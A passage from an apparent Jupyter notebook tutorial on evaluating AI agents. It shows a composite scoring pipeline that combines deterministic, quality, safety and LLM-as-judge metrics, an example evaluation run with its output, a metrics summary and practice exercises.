    print(f"  Accuracy: {s.accuracy:.0%}")
    print(f"  Avg latency: {s.avg_latency_ms:.0f}ms")
    print(f"  Avg tokens: {s.avg_tokens:.0f}")
    print(f"  Total cost: ${s.total_cost_usd:.4f}")
    print("\nUncomment more models in the cell above to see a comparison table.")


Single model tested: openai:local-model
  Accuracy: 50%
  Avg latency: 18057ms
  Avg tokens: 625
  Total cost: $0.0007

Uncomment more models in the cell above to see a comparison table.


---

## Part 7: Combining Metrics — The Full Evaluation Pipeline

The composite score combines all metrics into one number. This is what
you'll use for quick pass/fail decisions and trend tracking.

### How the composite score is calculated

```
composite = mean(
    1.0 if substring_match else 0.0,   ← Binary: answer present?
    keyword_coverage,                   ← 0.0-1.0: concepts covered?
    quality["score"],                   ← 0.0-1.0: well-formed answer?
    judge["score"],                     ← 0.0-1.0: semantically correct?
)
```

### Interpreting composite scores

| Score | Meaning | Action |
|-------|---------|--------|
| **0.9-1.0** | Excellent — agent nails it | Ship it |
| **0.7-0.9** | Good — minor issues | Check missing keywords, tweak prompt |
| **0.5-0.7** | Partial — significant gaps | Debug which metric is dragging it down |
| **< 0.5** | Poor — fundamentally wrong | Check if agent is even calling the right tool |

**Debugging tip**: When composite is low, look at individual metrics
to find the bottleneck. Is it keyword coverage (answer incomplete)?
Quality score (too vague)? Judge score (semantically wrong)?

In [23]:
# -----------------------------------------------------------------
# Full eval pipeline: deterministic + quality + safety + judge
# -----------------------------------------------------------------

def full_evaluation(
    question: str,
    expected_answer: str,
    expected_keywords: list[str],
    agent_answer: str,
    code_generated: str = "",
    use_judge: bool = True,
) -> dict:
    """Run all evaluation metrics on a single case."""
    results = {}
    
    # 1. Deterministic metrics
    results["substring_match"] = substring_match(agent_answer, expected_answer)
    results["keyword_coverage"] = keyword_coverage(agent_answer, expected_keywords)
    
    # Try numeric match if expected answer looks like a number
    try:
        expected_num = float(expected_answer.replace(",", ""))
        results["numeric_match"] = numeric_match(agent_answer, expected_num)
    except ValueError:
        results["numeric_match"] = None  # Not a numeric answer
    
    # 2. Quality heuristics
    results["quality"] = response_quality_score(agent_answer)
    
    # 3. Safety (if code was generated)
    if code_generated:
        results["safety"] = code_safety_score(code_generated)
    
    # 4. LLM-as-Judge (optional, costs money)
    if use_judge:
        prompt = (
            f"Question: {question}\n"
            f"Expected answer: {expected_answer}\n"
            f"Agent's answer: {agent_answer}"
        )
        verdict = run_agent_checked(judge_agent, prompt)
        results["judge"] = {
            "score": verdict.output.score,
            "correct": verdict.output.correct,
            "reasoning": verdict.output.reasoning,
        }
    
    # Composite score (weighted average)
    scores = []
    if results["substring_match"]:
        scores.append(1.0)
    else:
        scores.append(0.0)
    scores.append(results["keyword_coverage"])
    scores.append(results["quality"]["score"])
    if "judge" in results:
        scores.append(results["judge"]["score"])
    
    results["composite_score"] = sum(scores) / len(scores)
    
    return results


# Run full evaluation on an example
eval_result = full_evaluation(
    question="What is the total revenue?",
    expected_answer=str(total_revenue),
    expected_keywords=["revenue", "total"],
    agent_answer=f"The total revenue across all transactions is ${total_revenue:,.2f}, spanning all 4 regions.",
    code_generated="import pandas as pd\ndf = pd.read_csv('sales.csv')\nprint(df['revenue'].sum())",
    use_judge=True,
)

print("Full evaluation results:")
print(f"  Substring match: {eval_result['substring_match']}")
print(f"  Keyword coverage: {eval_result['keyword_coverage']:.0%}")
print(f"  Numeric match: {eval_result['numeric_match']}")
print(f"  Quality score: {eval_result['quality']['score']:.2f}")
print(f"  Safety: {eval_result.get('safety', {}).get('safe', 'N/A')}")
print(f"  Judge score: {eval_result.get('judge', {}).get('score', 'N/A')}")
print(f"  Judge reasoning: {eval_result.get('judge', {}).get('reasoning', 'N/A')}")
print(f"\n  COMPOSITE SCORE: {eval_result['composite_score']:.2f}")

Full evaluation results:
  Substring match: False
  Keyword coverage: 100%
  Numeric match: True
  Quality score: 1.00
  Safety: True
  Judge score: 1.0
  Judge reasoning: The agent's answer provides the correct total revenue value ($147,695.10), which is a properly rounded and formatted version of the expected answer (147695.09999999998). The slight difference is due to standard currency formatting (rounding to two decimal places) and the inclusion of a comma for readability, which does not affect factual correctness.

  COMPOSITE SCORE: 0.75


---

## Summary

| Metric | Type | Cost | Best For |
|--------|------|------|----------|
| `substring_match` | Deterministic | Free | Known-answer questions |
| `numeric_match` | Deterministic | Free | Numeric answers with tolerance |
| `keyword_coverage` | Deterministic | Free | Ensuring key concepts appear |
| `response_quality_score` | Heuristic | Free | Quick sanity checks |
| `code_safety_score` | AST analysis | Free | Detecting dangerous code |
| LLM-as-Judge | LLM call | ~$0.001/eval | Open-ended quality grading |
| `EvalHarness` | Framework | Varies | Running full test suites |

### Production Patterns

1. **Eval-driven development** — Write eval cases before changing the agent
2. **Layer your metrics** — Deterministic first, LLM-judge only when needed
3. **Track over time** — Save results to JSON/database, plot trends
4. **A/B test models** — Same eval suite, different providers, objective comparison
5. **Safety is non-negotiable** — Every code-generating agent needs safety checks
6. **Composite scores** — Combine metrics into a single number for quick comparison

### The Eval Workflow

```
Define eval cases (with ground truth)
        |
        v
Run agent on each case
        |
        v
Score: deterministic + heuristic + safety + judge
        |
        v
Analyze: by category, by difficulty, failures
        |
        v
Save results & compare to previous runs
```

**Next: Lesson 7 — Observability & Debugging (tracing every step of agent execution)**

---

## Exercises

1. **Add 10 more eval cases** — Cover edge cases: empty results, ambiguous questions, multi-table joins
2. **Build a regression checker** — Compare two eval runs and flag any cases that got worse
3. **Custom judge rubric** — Create specialized judges for different question types (aggregation vs trend analysis)
4. **Cost-adjusted scoring** — Penalize answers that use too many tool calls or tokens
5. **Eval dashboard** — Use matplotlib to visualize eval results across models and over time